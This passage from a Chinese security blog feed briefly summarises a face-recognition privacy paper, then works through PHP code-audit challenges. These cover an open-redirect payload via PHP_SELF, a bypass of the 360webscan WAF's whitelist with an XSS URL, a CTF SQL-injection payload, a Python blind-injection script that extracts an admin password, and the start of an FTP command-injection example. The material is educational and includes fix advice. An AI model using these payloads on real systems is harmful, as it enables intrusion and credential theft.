        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>文章提出了CamPro，这是一个新颖的方法，可以在相机模块中捕获天生具有AFR特性的图像。CamPro通过调整相机图像信号处理器（ISP）中的配置设置，例如颜色校正矩阵和伽马校正，来实现AFR，并设计了一个图像增强器来保持可能的人类观众的图像质量。实验表明，CamPro对十种最先进的黑盒面部识别模型非常有效，将面部识别准确率显著降低到0.3%，同时对目标非敏感视觉应用的影响很小。此外，CamPro对适应性攻击者也具有弹性，即使攻击者重新训练了使用CamPro生成的图像的面部识别模型，并且完全了解隐私保护ISP参数。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐私保护 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】PHP代码审计5</title>
      <link href="/2024/10/16/WebSecurity/codeaudit/phpaudit5/"/>
      <url>/2024/10/16/WebSecurity/codeaudit/phpaudit5/</url>
      
        <content type="html"><![CDATA[<h2 id="Day-15-Sleigh-Ride"><a href="#Day-15-Sleigh-Ride" class="headerlink" title="Day 15 - Sleigh Ride"></a>Day 15 - Sleigh Ride</h2><p>题目叫做滑雪橇，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Redirect</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$websiteHost</span>=<span class="string">&#x27;www.example.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setHeaders</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span>= <span class="title function_ invoke__">urldecode</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:<span class="subst">$url</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">startRedirect</span>(<span class="params"><span class="variable">$params</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$parts</span>= <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);</span><br><span class="line">        <span class="variable">$baseFile</span>= <span class="title function_ invoke__">end</span>(<span class="variable">$parts</span>);</span><br><span class="line">        <span class="variable">$url</span>= <span class="title function_ invoke__">sprintf</span>(</span><br><span class="line">            <span class="string">&quot;%s?%s&quot;</span>,</span><br><span class="line">            <span class="variable">$baseFile</span>,</span><br><span class="line">            <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$params</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setHeaders</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>])&#123;</span><br><span class="line">    (<span class="keyword">new</span> <span class="title class_">Redirect</span>())-&gt;<span class="title function_ invoke__">startRedirect</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;params&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞解析</strong> ：</p><p>这一关主要考察的是 <strong>$_SERVER[‘PHP_SELF’]</strong> 引发的一个任意网址跳转漏洞</p><p>首先，分析一下程序的运行</p><ul><li>如果有 <strong>$_GET[‘redirect’]</strong> 参数，那么就 New 一个 <strong>Redirect</strong> 对象，同时调用 <strong>Redirect</strong> 类的 <strong>startRedirect</strong> 方法</li><li><strong>startRedirect</strong> 函数接受一个 <strong>GET</strong> 类型的 <strong>params</strong> 参数，然后在 <strong>explode()</strong> 函数中，将 <strong>$_SERVER[‘PHP_SELF’]</strong> 得到的值，以 <strong>&#x2F;</strong> 分割成一个 <strong>$parts</strong> 数组。</li><li><strong>$baseFile</strong> 的值为 <strong>$parts</strong> 数组的最后一个值</li><li><strong>$url</strong> 的值为 <strong>$baseFile?http_build_query($params)</strong> ，其中的 <strong>http_build_query()</strong> 函数就是一个将参数进行URL编码的一个操作，比如 <strong>$params&#x3D;’test&#x3D;123’</strong></li><li>然后调用 <strong>setHeaders</strong> 函数，首先解码 <strong>$url</strong> 参数，然后 <strong>header()</strong> 函数直接跳转 <strong>$url</strong></li></ul><p><strong>$_SERVER[‘PHP’]</strong> 存在的问题：</p><p>初看这个程序没什么问题，但是PHP自带的**$_SERVER[‘PHP_SELF’]** 参数是可以控制的。其中 <strong>PHP_SELF</strong> 指当前的页面绝对地址，比如我们的网站：<strong><a href="http://www.test.com/redict/index.php">http://www.test.com/redict/index.php</a></strong>，那么<strong>PHP_SELF</strong> 就是 <strong>&#x2F;redict&#x2F;index.php</strong> 。但有个小问题很多人没有注意到，当<strong>URL</strong>是<strong>PATH_INFO</strong>的时候，比如：<strong><a href="http://www.test.com/redict/index.php/admin">http://www.test.com/redict/index.php/admin</a></strong>，那么<strong>PHP_SELF</strong>就是**&#x2F;redict&#x2F;index.php&#x2F;admin** 也就是说，其实 <strong>PHP_SELF</strong> 有一部分是我们可以控制的。</p><p>双编码问题：</p><p>URL本来是被浏览器编码过一次，服务器接收到来自浏览器URL请求的时候，会将URL解码一次，由于在程序中我们看到有 <strong>urldecode()</strong> 函数存在，它会再次解码一次URL，此时双编码URL就可以利用，用于绕过某些关键词检测。比如将 <strong>&#x2F;</strong> 编码为： <strong>%252f</strong> </p><p>漏洞利用：</p><p>比如我们要跳转到我的博客：<strong>blog.dyboy.cn</strong> ，那么就可以构造 <strong>Payload</strong> ：<strong><a href="http://www.test.com/index.php/http:%252f%252fblog.dyboy.cn?redirect=test&params=test123">http://www.test.com/index.php/http:%252f%252fblog.dyboy.cn?redirect=test&amp;params=test123</a></strong> ，访问即可重定向跳转到 <strong><a href="http://blog.dyboy.cn/">http://blog.dyboy.cn</a></strong> 网址。如下图所示，发生了 <strong>302</strong> 跳转：</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image.png"></p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>其实关于这个漏洞的利用，是有很多src案例的。但是都是黑盒测试，不是很清楚后台的代码怎么设计的，这里可以提及到一个关于 <strong>360webscan</strong> 的防护脚本一个历史漏洞，正是使用了 <strong>$_SERVER[‘PHP_SELF’]</strong> 这个变量，导致可以绕过360webscan防护脚本的防护，脚本的防护效果失效，现在此防护脚本更新了。</p><p>最新版下载地址： <a href="http://webscan.360.cn/protect/down?domain=www.test.com">http://webscan.360.cn/protect/down?domain=www.test.com</a></p><p>旧版本下载地址：<a href="https://www.lanzous.com/i1qj0qh">https://www.lanzous.com/i1qj0qh</a></p><p>其结构为：</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-1.png"></p><p>因为这只是一个防护的辅助脚本，任何的程序都可以安装使用，这里就以 <strong>Emlog5.3.1</strong> 博客程序为例子，程序不重要，这个脚本可以安装接入到任何的程序中。</p><p>安装的方法：解压得到 <strong>360safe</strong> 文件夹，之后上传到我们的网站根目录中，同时在任意的全局文件中加入如下代码即可安装成功：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/360safe/360webscan.php&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/360safe/360webscan.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在按照上述安装方法安装后，测试访问： <code>http://www.test.com/index.php?test=&lt;script&gt;alert(1)&lt;/script&gt;</code> ，XSS拦截显示：</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-2.png"></p><p>比如GET传递的数据存在SQL注入恶意字符都会被拦截，虽然本脚本的正则过滤规则很好了，但是通过这一个 <strong>$_SERVER[‘PHP_SELF’]</strong> ，可以通过白名单规则绕过攻击防护。</p><p>在存在绕过漏洞的360webscan历史版本中，如下图 <strong>第194-219行</strong> 的的代码（拦截目录白名单检测）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">webscan_white</span>(<span class="params"><span class="variable">$webscan_white_name</span>, <span class="variable">$webscan_white_url</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    <span class="variable">$url_path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line">    <span class="variable">$url_var</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$webscan_white_url</span> <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span> . <span class="variable">$webscan_white_name</span> . <span class="string">&quot;/is&quot;</span>, <span class="variable">$url_path</span>) == <span class="number">1</span> &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$webscan_white_name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 拦截目录白名单</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">empty</span>(<span class="variable">$url_var</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$url_var</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$url_path</span>, <span class="variable">$key</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$url_var</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上图的 <strong>第5行</strong> ，我们看到 <strong>$url_path</strong> 的值是直接取的 <strong>$_server[‘PHP_SELF’]</strong> 的值，同时没有做任何的验证或过滤。那么我们只要在请求的URL（提交的参数中）存在白名单目录，那么就可以绕过安全检测。</p><p>因为在 <strong>webscan_cache.php</strong> 中的默认的白名单目录存在 <strong>admin</strong> 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户唯一key</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WEBSCAN_U_KEY&#x27;</span>, <span class="string">&#x27;6809abbda8d53816f11500b52637e8db&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据回调统计地址</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WEBSCAN_API_LOG&#x27;</span>, <span class="string">&#x27;http://safe.webscan.360.cn/papi/log/?key=&#x27;</span> . WEBSCAN_U_KEY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 版本更新地址</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WEBSCAN_UPDATE_FILE&#x27;</span>, <span class="string">&#x27;http://safe.webscan.360.cn/papi/update/?key=&#x27;</span> . WEBSCAN_U_KEY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拦截开关(1为开启，@关闭)</span></span><br><span class="line"><span class="variable">$webscan_switch</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提交方式拦截(1开启拦截，@关闭拦截，post,get,cookie,referre选择需要拦截的方式)</span></span><br><span class="line"><span class="variable">$webscan_post</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$webscan_get</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$webscan_cookie</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$webscan_referre</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后台白名单,后台操作将不会拦截,添加&quot;|&quot;隔开白名单目录下面默认是网址带admin/dede/放行</span></span><br><span class="line"><span class="variable">$webscan_white_directory</span> = <span class="string">&#x27;admin|\/dede\/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// url白名单，可以自定义添加url白名单，默认是对phpcms的后台url放行</span></span><br><span class="line"><span class="variable">$webscan_white_url</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;index.php&#x27;</span> =&gt; <span class="string">&#x27;m=admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;post.php&#x27;</span> =&gt; <span class="string">&#x27;job=postnew&amp;step=post&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edit_space_info.php&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们访问：<strong><a href="http://www.test.com/index.php/admin?test=%3Cscript%3Ealert(1)%3C/script%3E">http://www.test.com/index.php/admin?test=%3Cscript%3Ealert(1)%3C/script%3E</a></strong></p><p>此处虽然返回的状态码是 <strong>404</strong> ，但是，我们发现已经不再拦截了，如果再配合某些CMS或者PHP系统的伪静态特殊性，那么就可以成功的绕过防护。</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>本次审计的其实不是漏洞，主要是一个 <strong>$_SERVER[‘PHP_SELF’]</strong> 的问题，再遇上某系伪静态规则配合下，就会导致各种由此形成的各种漏洞。因此，这里推荐使用 <strong>$_SERVER[‘SCRIPT_NAME’]</strong> 代替即可，同时，我们可以看到在最新的360webscan中已经更新了这个问题，并且就是使用 <strong>$_SERVER[‘SCRIPT_NAME’]</strong> 。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$black_list</span> = <span class="string">&quot;/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\&#x27;|&quot;</span>;</span><br><span class="line"><span class="variable">$black_list</span> .= <span class="string">&quot;=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$black_list</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;:P&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$black_list</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;pwd&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;:P&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select user from users where user=&#x27;<span class="subst">$_GET</span>[user]&#x27; and pwd=&#x27;<span class="subst">$_GET</span>[pwd]&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;<span class="subst">&#123;$query&#125;</span>&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;user&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Welcome <span class="subst">&#123;$row[&#x27;user&#x27;]&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select pwd from users where user=&#x27;admin&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="variable">$admin_pass</span> = <span class="variable">$row</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$admin_pass</span>)&amp;&amp;(<span class="variable">$admin_pass</span> === <span class="variable">$_GET</span>[<span class="string">&#x27;pwd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题主要还是绕过防护成功进行sql注入,我们可以看到 第25-26行 ，只要我们知道 Admin 用户的密码，就能拿到flag。在 第11行 处 $_GET[user] 和 $_GET[pwd] 两个变量可控，存在SQL注入。再看 第6-7行 ，当中过滤了 # 、 - 号，那么我们就无法进行常规的注释，但是我们可以用 ;%00 来进行注释。 $black_list 还过滤了很多字符串截取函数，这里我们可使用 regexp 来解决。最终我们的payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/CTF/?user=\&amp;pwd=||1;%00</span><br><span class="line">对应SQL语句为：</span><br><span class="line">select user from users where user=&#x27;\&#x27; and pwd=&#x27;||1;&#x27;</span><br><span class="line">等价于：</span><br><span class="line">select user from users where user=&#x27;xxxxxxxxxxx&#x27;||1#</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">char_set = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz_&#x27;</span></span><br><span class="line">pw = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> char_set:</span><br><span class="line">        url = <span class="string">&#x27;http://localhost/CTF/?user=\\&amp;pwd=||pwd/**/regexp/**/&quot;^%s&quot;;%%00&#x27;</span></span><br><span class="line">        r = requests.get(url=url%(pw+ch))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Welcome Admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            pw += ch</span><br><span class="line">            <span class="built_in">print</span>(pw)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> ch == <span class="string">&#x27;_&#x27;</span>: <span class="keyword">break</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://localhost/CTF/?user=&amp;pwd=%s&#x27;</span> % pw)</span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">&#x27;HRCTF&#123;\S&#123;1,50&#125;&#125;&#x27;</span>,r.text)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>REGEXP 是MySQL中的正则表达式匹配操作符，它检查pwd字段是否匹配指定的正则表达式。<br>如果pwd字段以猜测的密码字符开头，那么正则表达式匹配成功，SQL查询将返回结果。<br>由于这是一个布尔盲注攻击，攻击者无法直接看到查询结果，而是通过服务器的响应来判断正则表达式是否匹配成功。</p><p><a href="https://www.leavesongs.com/penetration/360webscan-bypass.html">360webscan防注入脚本全面绕过</a> </p><h2 id="Day-16-Poem"><a href="#Day-16-Poem" class="headerlink" title="Day 16 - Poem"></a>Day 16 - Poem</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTP</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sock</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sock = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="variable">$port</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$user</span>, <span class="variable">$pass</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanInput</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">mode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;mode&#x27;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">send</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanInput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$_GET</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;intval&#x27;</span>, <span class="variable">$_GET</span>);</span><br><span class="line">        <span class="variable">$_POST</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;intval&#x27;</span>, <span class="variable">$_POST</span>);</span><br><span class="line">        <span class="variable">$_COOKIE</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;intval&#x27;</span>, <span class="variable">$_COOKIE</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;sock, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;sock, <span class="variable">$username</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;sock, <span class="variable">$password</span> .<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mode</span>(<span class="params"><span class="variable">$mode</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$mode</span> == <span class="number">1</span> || <span class="variable">$mode</span> == <span class="number">2</span> || <span class="variable">$mode</span> == <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;sock, <span class="string">&quot;MODE<span class="subst">$mode</span>\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;sock, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FTP</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">21</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>漏洞解析</strong> ：</p><p>这道题目包含了两个漏洞，利用这两个漏洞，我们可以往FTP连接资源中注入恶意数据，执行FTP命令。首先看到 <strong>第7行</strong> 代码，可以发现程序使用 <strong>cleanInput</strong> 方法过滤 <strong>GET</strong> 、 <strong>POST</strong> 、 <strong>COOKIE</strong> 数据，将他们强制转成整型数据。然而在 <strong>第8行</strong> 处，却传入了一个从 <strong>REQUEST</strong> 方式获取的 <strong>mode</strong> 变量。我们都知道超全局数组 <strong>$_REQUEST</strong> 中的数据，是 <strong>$_GET</strong> 、 <strong>$_POST</strong> 、 <strong>$_COOKIE</strong> 的合集，而且数据是复制过去的，并不是引用。我们先来看一个例子，来验证这一观点：</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-3.png"></p><p>可以发现 <strong>REQUEST</strong> 数据丝毫不受过滤函数的影响。回到本例题，例题中的程序过滤函数只对 <strong>GET</strong> 、 <strong>POST</strong> 、 <strong>COOKIE</strong> 数据进行操作，最后拿来用的却是 